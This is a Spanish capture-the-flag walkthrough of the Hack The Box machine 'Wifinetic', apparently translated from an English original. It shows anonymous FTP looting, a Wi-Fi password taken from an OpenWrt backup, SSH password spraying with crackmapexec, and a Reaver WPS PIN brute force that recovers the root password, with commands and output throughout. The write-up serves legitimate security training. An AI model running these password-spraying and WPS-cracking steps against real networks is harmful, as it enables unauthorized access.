---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Wifinetic

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

## Escaneo de la máquina.

```bash
nmap -sV -sC 10.10.11.247  -oA initial 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-14 23:23 EDT
Nmap scan report for 10.10.11.247
Host is up (0.20s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT      STATE    SERVICE    VERSION
21/tcp    open     ftp        vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.93
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
| -rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
| -rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf
| -rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
|_-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf
22/tcp    open     ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
53/tcp    open     tcpwrapped
15003/tcp filtered unknown
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.08 seconds


```

### Realizar prueba con FTP

```bash
ftp 10.10.11.247
```

```bash
ftp> ls
229 Entering Extended Passive Mode (|||41883|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
-rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
-rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf
-rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar                                                                         
-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf
226 Directory send OK.
```

**Se obtienen los archivos con mget**

```bash
ftp> prompt off
Interactive mode off.
ftp> mget *
local: MigrateOpenWrt.txt remote: MigrateOpenWrt.txt
229 Entering Extended Passive Mode (|||46603|)
150 Opening BINARY mode data connection for MigrateOpenWrt.txt (4434 bytes).
100% |****************************************************|  4434       12.66 MiB/s    00:00 ETA226 Transfer complete.
4434 bytes received in 00:00 (45.51 KiB/s)
local: ProjectGreatMigration.pdf remote: ProjectGreatMigration.pdf
229 Entering Extended Passive Mode (|||43303|)
150 Opening BINARY mode data connection for ProjectGreatMigration.pdf (2501210 bytes).
100% |****************************************************|  2442 KiB    1.19 MiB/s    00:00 ETA226 Transfer complete.
2501210 bytes received in 00:02 (1.14 MiB/s)
local: ProjectOpenWRT.pdf remote: ProjectOpenWRT.pdf
229 Entering Extended Passive Mode (|||41309|)
150 Opening BINARY mode data connection for ProjectOpenWRT.pdf (60857 bytes).
100% |****************************************************| 60857      312.13 KiB/s    00:00 ETA226 Transfer complete.
60857 bytes received in 00:00 (208.67 KiB/s)
local: backup-OpenWrt-2023-07-26.tar remote: backup-OpenWrt-2023-07-26.tar
229 Entering Extended Passive Mode (|||48627|)
150 Opening BINARY mode data connection for backup-OpenWrt-2023-07-26.tar (40960 bytes).
100% |****************************************************| 40960      418.15 KiB/s    00:00 ETA226 Transfer complete.
40960 bytes received in 00:00 (210.50 KiB/s)
local: employees_wellness.pdf remote: employees_wellness.pdf
229 Entering Extended Passive Mode (|||45844|)
150 Opening BINARY mode data connection for employees_wellness.pdf (52946 bytes).
100% |****************************************************| 52946      271.76 KiB/s    00:00 ETA226 Transfer complete.
52946 bytes received in 00:00 (181.35 KiB/s)
```

**Archivo e informacion obtenida**

* `employees_wellness.pdf` &#x20;
* `samantha.wood93@wifinetic.htb`
* `ProjectGreatMigration.pdf`&#x20;
* `ProjectOpenWRT.pdf`
* `management@wifinetic.htb`
* &#x20;`olivia.walker17@wifinetic.htb`
* `MigrateOpenWrt.txt`&#x20;
* `backup-OpenWrt-2023-07-26.tar`&#x20;

Profundizando en la copia de seguridad, hay una `etc`carpeta:

```
oxdf@hacky$ ls etc
config  dropbear  group  hosts  inittab  luci-uploads  nftables.d  opkg  passwd  profile  rc.local  shells  shinit  sysctl.conf  uhttpd.crt  uhttpd.key
```

La mayoría de estos no tienen mucho de interesante. `passwd`proporciona una lista de nombres de usuario:

```
root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
ntp:x:123:123:ntp:/var/run/ntp:/bin/false
dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false
logd:x:514:514:logd:/var/run/logd:/bin/false
ubus:x:81:81:ubus:/var/run/ubus:/bin/false
netadmin:x:999:999::/home/netadmin:/bin/false
```

El `config`directorio tiene un puñado de archivos:

```
oxdf@hacky$ ls etc/config/
dhcp  dropbear  firewall  luci  network  rpcd  system  ucitrack  uhttpd  wireless
```

El único que tiene algo útil es `wireless`:

```
oxdf@hacky$ cat etc/config/wireless 

config wifi-device 'radio0'
        option type 'mac80211'
        option path 'virtual/mac80211_hwsim/hwsim0'
        option cell_density '0'
        option channel 'auto'
        option band '2g'
        option txpower '20'

config wifi-device 'radio1'
        option type 'mac80211'
        option path 'virtual/mac80211_hwsim/hwsim1'
        option channel '36'
        option band '5g'
        option htmode 'HE80'
        option cell_density '0'

config wifi-iface 'wifinet0'
        option device 'radio0'
        option mode 'ap'
        option ssid 'OpenWrt'
        option encryption 'psk'
        option key 'VeRyUniUqWiFIPasswrd1!'
        option wps_pushbutton '1'

config wifi-iface 'wifinet1'
        option device 'radio1'
        option mode 'sta'
        option network 'wwan'
        option ssid 'OpenWrt'
        option encryption 'psk'
        option key 'VeRyUniUqWiFIPasswrd1!'
```

Está definiendo dos dispositivos, cada uno con una interfaz. Hay una clave precompartida (PSK o contraseña) para una red WiFi.

#### DNS-TCP/USP 53 <a href="#dns---tcpusp-53" id="dns---tcpusp-53"></a>

Dado el uso de `wifinetic.htb`en los documentos, lo agregaré a mi `/etc/hosts`archivo:

```
10.10.11.247 wifinetic.htb
```

Dado que DNS está escuchando en TCP, intentaré una transferencia de zona para ver si hay subdominios:

```
oxdf@hacky$ dig asxf @10.10.11.247 wifinetic.htb
;; communications error to 10.10.11.247#53: timed out
;; communications error to 10.10.11.247#53: timed out
;; communications error to 10.10.11.247#53: timed out

; <<>> DiG 9.18.12-0ubuntu0.22.04.1-Ubuntu <<>> asxf @10.10.11.247 wifinetic.htb
;; global options: +cmd
;; no servers could be reached

;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 17349
;; flags: qr aa rd ra ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 65494
;; QUESTION SECTION:
;wifinetic.htb.                 IN      A

;; ANSWER SECTION:
wifinetic.htb.          0       IN      A       10.10.11.247

;; Query time: 0 msec
;; SERVER: 127.0.0.53#53(127.0.0.53) (UDP)
;; WHEN: Tue Sep 12 20:44:43 EDT 2023
;; MSG SIZE  rcvd: 58
```

No estoy seguro de por qué se agota el tiempo al principio, pero eventualmente lo logra y encuentra solo el dominio principal.

### Shell como administrador de red <a href="#shell-as-netadmin" id="shell-as-netadmin"></a>

#### Fuerza bruta de contraseña SSH <a href="#ssh-password-bruteforce" id="ssh-password-bruteforce"></a>

Con la contraseña de la configuración Wifi, la usaré `crackmapexec`para probar cada usuario del `passwd`archivo con la contraseña de la configuración inalámbrica a través de SSH. Me gusta usar `--continue-on-success`en caso de que haya más de un usuario que comparta esa contraseña. Encuentra uno:

```
oxdf@hacky$ crackmapexec ssh 10.10.11.247 -u users -p 'VeRyUniUqWiFIPasswrd1!' -
ontinue-on-success
SSH         10.10.11.247    22     10.10.11.247     [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9
SSH         10.10.11.247    22     10.10.11.247     [-] root:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] daemon:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] ftp:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] network:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] nobody:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] ntp:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] dnsmasq:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] logd:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] ubus:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [+] netadmin:VeRyUniUqWiFIPasswrd1!
```

#### Caparazón <a href="#shell" id="shell"></a>

Puedo conectarme con ese nombre de usuario/contraseña:

```
oxdf@hacky$ sshpass -p 'VeRyUniUqWiFIPasswrd1!' ssh netadmin@10.10.11.247
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-162-generic x86_64)
...[snip]...
netadmin@wifinetic:~$ 
```

Y lea la bandera del usuario:

```
netadmin@wifinetic:~$ cat user.txt
e5540a0a************************
```

### Shell como raíz <a href="#shell-as-root" id="shell-as-root"></a>

#### Enumeración <a href="#enumeration" id="enumeration"></a>

**Sistema de archivos**

**Directorios de inicio**

El directorio de inicio del usuario netadmin está básicamente vacío:

```
netadmin@wifinetic:~$ ls -la
total 28
drwxr-xr-x  3 netadmin netadmin 4096 Sep 11 16:40 .
drwxr-xr-x 24 root     root     4096 Sep 11 16:58 ..
lrwxrwxrwx  1 root     root        9 Sep 11 16:08 .bash_history -> /dev/null
-rw-r--r--  1 netadmin netadmin  220 Feb 25  2020 .bash_logout
-rw-r--r--  1 netadmin netadmin 3771 Feb 25  2020 .bashrc
drwx------  2 netadmin netadmin 4096 Sep 11 16:40 .cache
-rw-r--r--  1 netadmin netadmin  807 Feb 25  2020 .profile
-rw-r-----  1 root     netadmin   32 Sep 13 11:01 user.txt
```

Hay muchos otros usuarios con directorios de inicio en `/home`:

```
netadmin@wifinetic:/home$ ls
ayoung33   dwright27   janderson42  lturner56  mrobinson78  owalker17  sjohnson88  tclark84
bwhite3    eroberts25  jletap77     mhughes12  netadmin     pharris47  swood93
dmorgan99  jallen10    kgarcia22    mickhat    nlee61       rturner45  tcarter90
```

Todos son iguales, con algunos archivos estándar y un `.ssh`directorio al que netadmin no puede acceder.

**/optar**

`/opt`tiene un `share`directorio que parece coincidir con lo que está disponible a través de FTP:

```
netadmin@wifinetic:/opt$ ls
share
netadmin@wifinetic:/opt$ cd share/
netadmin@wifinetic:/opt/share$ ls
backup-OpenWrt-2023-07-26.tar  MigrateOpenWrt.txt         ProjectOpenWRT.pdf
employees_wellness.pdf         ProjectGreatMigration.pdf
```

El `vsftpd.conf`archivo `/etc/`confirma esto (usando `grep`para eliminar líneas que comienzan con un marcador de comentario `#`):

```
netadmin@wifinetic:/etc$ cat vsftpd.conf  | grep -v "^#"
listen=NO
listen_ipv6=YES
anonymous_enable=yes
local_enable=NO
anon_root=/opt/share/
no_anon_password=YES
hide_ids=YES
pasv_min_port=40000
pasv_max_port=50000
anon_mkdir_write_enable=YES
anon_mkdir_write_enable=YES
dirmessage_enable=YES
use_localtime=YES
xferlog_enable=YES
connect_from_port_20=YES
chown_uploads=YES
chown_username=ftp
secure_chroot_dir=/var/run/vsftpd/empty
pam_service_name=vsftpd
rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem
rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key
ssl_enable=NO
```

**Binarios privilegiados**

Siempre buscaré binarios SetUID y SetGID interesantes. Las herramientas de enumeración como \[LinPEAS])() también las identificarán:

```
netadmin@wifinetic:~$ find / -perm -4000 -or -perm -2000 2>/dev/null
/usr/local/lib/python3.8
/usr/local/lib/python3.8/dist-packages
/usr/sbin/pam_extrausers_chkpwd
/usr/sbin/unix_chkpwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/wall
/usr/bin/mount
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/ssh-agent
/usr/bin/umount
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/expiry
/usr/bin/bsd-write
/usr/bin/chsh
/usr/bin/chage
/usr/bin/at
/usr/bin/chfn
/usr/bin/crontab
/usr/bin/newgrp
/usr/bin/su
/var/local
/var/log/journal
/var/log/journal/8e7b2e7692df48faa4e42d6cfc791ed2
/var/mail
/run/log/journal
```

![expandir](https://0xdf.gitlab.io/icons/expand.png)

Todos estos parecen estándar. También buscaré binarios con capacidades:

```
netadmin@wifinetic:~$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/reaver = cap_net_raw+ep
```

¡El último salta! [¡ Reaver](https://manpages.ubuntu.com/manpages/jammy/man1/reaver.1.html) es una herramienta para descifrar WPS!

**Interfaces Wi-Fi**

En cuanto a las interfaces de red, ¡hay seis!

```
netadmin@wifinetic:~$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.247  netmask 255.255.254.0  broadcast 10.10.11.255
        inet6 dead:beef::250:56ff:feb9:a136  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:a136  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:a1:36  txqueuelen 1000  (Ethernet)
        RX packets 78157  bytes 4862131 (4.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 67703  bytes 6498829 (6.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 32188  bytes 1932028 (1.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 32188  bytes 1932028 (1.9 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

mon0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec 02-00-00-00-02-00-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 134589  bytes 23695914 (23.6 MB)
        RX errors 0  dropped 134589  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.1  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:0  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:00:00  txqueuelen 1000  (Ethernet)
        RX packets 4486  bytes 422644 (422.6 KB)
        RX errors 0  dropped 617  overruns 0  frame 0
        TX packets 5183  bytes 601033 (601.0 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.23  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:100  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:01:00  txqueuelen 1000  (Ethernet)
        RX packets 1304  bytes 181765 (181.7 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4486  bytes 503392 (503.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan2: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 02:00:00:00:02:00  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`eth0`es la interfaz LAN estándar que tiene la IP 10.10.11.247 que he estado atacando. `lo`es la interfaz localhost estándar con 127.0.0.1.

`mon`Las interfaces (como `mon0`) se utilizan normalmente para interfaces en modo monitor. Esto se utiliza para rastrear y monitorear el tráfico en una red WiFi. `wlan`Las interfaces (como las otras tres) se utilizan para interactuar con redes inalámbricas.

Las configuraciones inalámbricas generalmente se almacenan en `/etc/wpa_supplicant.conf`, que está presente, pero netadmin no puede leerlo:

```
netadmin@wifinetic:/etc$ cat wpa_supplicant.conf 
cat: wpa_supplicant.conf: Permission denied
```

`iw dev`Dará más información sobre las interfaces inalámbricas:

```
netadmin@wifinetic:~$ iw dev
phy#2
        Interface mon0
                ifindex 7
                wdev 0x200000002
                addr 02:00:00:00:02:00
                type monitor
                txpower 20.00 dBm
        Interface wlan2
                ifindex 5
                wdev 0x200000001
                addr 02:00:00:00:02:00
                type managed
                txpower 20.00 dBm
phy#1
        Unnamed/non-netdev interface
                wdev 0x100000155
                addr 42:00:00:00:01:00
                type P2P-device
                txpower 20.00 dBm
        Interface wlan1
                ifindex 4
                wdev 0x100000001
                addr 02:00:00:00:01:00
                ssid OpenWrt
                type managed
                channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
                txpower 20.00 dBm
phy#0
        Interface wlan0
                ifindex 3
                wdev 0x1
                addr 02:00:00:00:00:00
                ssid OpenWrt
                type AP
                channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
                txpower 20.00 dBm
```

Esto brinda mucha información sobre cada interfaz de red física, así como sobre las interfaces en ellas.

`wlan0`Está encendido `phy0`. Se está ejecutando como un punto de acceso ( `type AP`) con SSID `OpenWrt`en el canal 1.

`wlan1`está activado `phy1`y se ejecuta en modo "administrado", lo que sugiere que es un cliente. Dado que el SSID, el canal y la frecuencia central son los mismos que `wlan0`, este es un cliente en ese punto de acceso.

`wlan2`y `mon0`están encendidos `phy2`. `wlan2`También actúa como cliente (en modo "administrado"), mientras que as `mon0`está en modo monitor como se sospecha. `wlan2`no muestra ninguna conexión.

#### Fuerza bruta WPA <a href="#wpa-brute-force" id="wpa-brute-force"></a>

**Fondo**

La configuración protegida WiFi (WPS) es un estándar diseñado para facilitar la conexión a un enrutador WiFi, especialmente en entornos domésticos. El dispositivo tendría un PIN de 8 dígitos impreso en el dispositivo y el usuario podría ingresar ese PIN para unirse a la red.

Hay un problema con la implementación que hace que sea trivial aplicar fuerza bruta al pin de 8 dígitos. En teoría, esto debía ofrecer cien millones de pines posibles. En la práctica, el sistema WPS le dirá si los primeros cuatro dígitos son correctos y luego si los siguientes tres dígitos son correctos. También utiliza el último dígito como suma de verificación. Esto significa que para lograr una fuerza bruta eficaz, un atacante sólo necesita probar 10.000 posibilidades para los primeros cuatro, 1.000 para los siguientes cuatro o como máximo 11.000 pines (¡mucho menos de cien millones!).

Reaver es una herramienta que se utiliza para recuperar la red WPA PSK (contraseña) mediante fuerza bruta en el pin WPS.

**Uso del atracador**

La ejecución `reaver`muestra dos argumentos obligatorios:

```
netadmin@wifinetic:~$ reaver

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

Required Arguments:
        -i, --interface=<wlan>          Name of the monitor-mode interface to use
        -b, --bssid=<mac>               BSSID of the target AP

Optional Arguments:
        -m, --mac=<mac>                 MAC of the host system
        -e, --essid=<ssid>              ESSID of the target AP
        -c, --channel=<channel>         Set the 802.11 channel for the interface (implies -f)
        -s, --session=<file>            Restore a previous session file
        -C, --exec=<command>            Execute the supplied command upon successful pin recovery
        -f, --fixed                     Disable channel hopping
        -5, --5ghz                      Use 5GHz 802.11 channels
        -v, --verbose                   Display non-critical warnings (-vv or -vvv for more)
        -q, --quiet                     Only display critical messages
        -h, --help                      Show help

Advanced Options:
        -p, --pin=<wps pin>             Use the specified pin (may be arbitrary string or 4/8 digit WPS pin)
        -d, --delay=<seconds>           Set the delay between pin attempts [1]
        -l, --lock-delay=<seconds>      Set the time to wait if the AP locks WPS pin attempts [60]
        -g, --max-attempts=<num>        Quit after num pin attempts
        -x, --fail-wait=<seconds>       Set the time to sleep after 10 unexpected failures [0]
        -r, --recurring-delay=<x:y>     Sleep for y seconds every x pin attempts
        -t, --timeout=<seconds>         Set the receive timeout period [10]
        -T, --m57-timeout=<seconds>     Set the M5/M7 timeout period [0.40]
        -A, --no-associate              Do not associate with the AP (association must be done by another application)
        -N, --no-nacks                  Do not send NACK messages when out of order packets are received
        -S, --dh-small                  Use small DH keys to improve crack speed
        -L, --ignore-locks              Ignore locked state reported by the target AP
        -E, --eap-terminate             Terminate each WPS session with an EAP FAIL packet
        -J, --timeout-is-nack           Treat timeout as NACK (DIR-300/320)
        -F, --ignore-fcs                Ignore frame checksum errors
        -w, --win7                      Mimic a Windows 7 registrar [False]
        -K, --pixie-dust                Run pixiedust attack
        -Z                              Run pixiedust attack

Example:
        reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -vv
```

Necesito el nombre de la interfaz en modo monitor y el BSSID del AP de destino. El ejemplo en la parte inferior `reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -vv`muestra que el BSSID parece una dirección MAC y, de hecho, [lo es](https://en.wikipedia.org/wiki/Service\_set\_\(802.11\_network\)) .

**Ejecutar atracador**

El AP de destino es `wlan0`, que tiene una MAC del `iw`comando anterior de `02:00:00:00:00:00`. La interfaz en modo monitor es `mon0`. La mayoría de `reaver`los tutoriales muestran el uso del `wash`comando para obtener el BSSID/MAC. Esto no funciona aquí y lo veré en [Beyond Root](https://0xdf.gitlab.io/2023/09/16/htb-wifinetic.html#beyond-root) .

Los usaré para ejecutar `reaver`:

```
netadmin@wifinetic:~$ reaver -i mon0 -b 02:00:00:00:00:00 -vv

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 02:00:00:00:00:00
[+] Switching mon0 to channel 1
[+] Received beacon from 02:00:00:00:00:00
[+] Trying pin "12345670"
[+] Sending authentication request
[!] Found packet with bad FCS, skipping...
[+] Sending association request
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received M3 message
[+] Sending M4 message
[+] Received M5 message
[+] Sending M6 message
[+] Received M7 message
[+] Sending WSC NACK
[+] Sending WSC NACK
[+] Pin cracked in 2 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
[+] AP SSID: 'OpenWrt'
[+] Nothing done, nothing to save.
```

Muy rápidamente puede descifrar la contraseña WPA (o clave precompartida (PSK)) de la red inalámbrica.

#### su/SSH <a href="#su--ssh" id="su--ssh"></a>

Esta contraseña funciona como contraseña para root en el cuadro, ya sea `su`en una sesión existente:

```
netadmin@wifinetic:~$ su -
Password: 
root@wifinetic:~#
```

O iniciar una nueva sesión SSH:

```
oxdf@hacky$ sshpass -p 'WhatIsRealAnDWhAtIsNot51121!' ssh root@10.10.11.247
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-162-generic x86_64)
...[snip]...
root@wifinetic:~# 
```

De cualquier manera, puedo agarrar `root.txt`:

```
root@wifinetic:~# cat root.txt
b8e6c359************************
```

### Más allá de la raíz <a href="#beyond-root" id="beyond-root"></a>

#### Fondo <a href="#background-1" id="background-1"></a>

La mayoría de los tutoriales que muestran cómo ejecutar `reaver`usarán algo como `wash -i mon0`obtener los BSSID de las redes disponibles y enumerar si el WPS está bloqueado (lo que hace que sea mucho menos probable que funcione la fuerza bruta).

`wash`es una herramienta que forma parte de `reaver`y está destinada a enumerar redes. Pero requiere la `CAP_NET_RAW`capacidad, al igual que `reaver`hace.

Es inusual realizar este ataque sin root en el cuadro atacante. Normalmente, este ataque se realiza desde el hardware del controlador del atacante en las proximidades locales de la red WiFi. Pero incluso si alguien lo hace desde una caja comprometida, necesitará root, ya que es _muy_ poco probable que `reaver`se encuentre con las capacidades necesarias en el mundo real, como es el caso de HTB.

#### Ejecutando lavado como netadmin <a href="#running-wash-as-netadmin" id="running-wash-as-netadmin"></a>

Con un shell no root en el cuadro, si intento ejecutar `wash -i mon0`como se recomienda y simplemente se cuelga:

```
netadmin@wifinetic:~$ wash -i mon0
BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
--------------------------------------------------------------------------------
```

#### Revisión de la fuente <a href="#source-review" id="source-review"></a>

El código fuente `wash`está [aquí](https://github.com/t6x/reaver-wps-fork-t6x/blob/bd0f38262224c1b88ba9f1f95cb5476a488d2295/src/wpsmon.c#L155) , comenzando con la `wash_main`función. No soy un experto en C, pero parece que está trabajando activamente en la red.

Hay una función llamada `send_probe_request` [aquí](https://github.com/t6x/reaver-wps-fork-t6x/blob/bd0f38262224c1b88ba9f1f95cb5476a488d2295/src/wpsmon.c#L595) que envía un paquete. También hay un bucle `next_packet`. En base a esto, tiene mucho sentido que `wash`necesite algún tipo de capacidad o privilegio de root para poder funcionar. De hecho, recibo errores cuando intento ejecutar `wash`en alguna otra interfaz:

```
netadmin@wifinetic:~$ wash -i wlan0
[X] ERROR: pcap_activate status -1
[X] PCAP: generic error code
couldn't get pcap handle, exiting
netadmin@wifinetic:~$ wash -i wlan1
[X] ERROR: pcap_activate status -1
[X] PCAP: generic error code
couldn't get pcap handle, exiting
netadmin@wifinetic:~$ wash -i wlan2
[X] ERROR: pcap_activate status -1
[X] PCAP: generic error code
couldn't get pcap handle, exiting
```

#### Ejecutar lavado como raíz <a href="#run-wash-as-root" id="run-wash-as-root"></a>

En este punto, parece que se trata claramente de una cuestión de permisos. Por eso es sorprendente cuando ejecutar como root da el mismo resultado:

```
root@wifinetic:~# wash -i mon0
BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
--------------------------------------------------------------------------------
```

Curiosamente, ahora se cuelga en lugar de fallar `wlan0`y `wlan1`:

```
root@wifinetic:~# wash -i wlan0
BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
--------------------------------------------------------------------------------
^C
root@wifinetic:~# wash -i wlan1
BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
--------------------------------------------------------------------------------
^C
```

Más interesante aún, funciona en `wlan2`:

```
root@wifinetic:~# wash -i wlan2
BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
--------------------------------------------------------------------------------
02:00:00:00:00:00    1  -30  2.0  No             OpenWrt
```

Aún _más_ interesante, cuando ejecuté esto en `wlan2`, lo estaba `wash -i mon0`ejecutando en otra terminal y se imprimió el resultado al mismo tiempo:

```
root@wifinetic:~# wash -i mon0
BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
--------------------------------------------------------------------------------
02:00:00:00:00:00    1  -30  2.0  No             OpenWrt
```
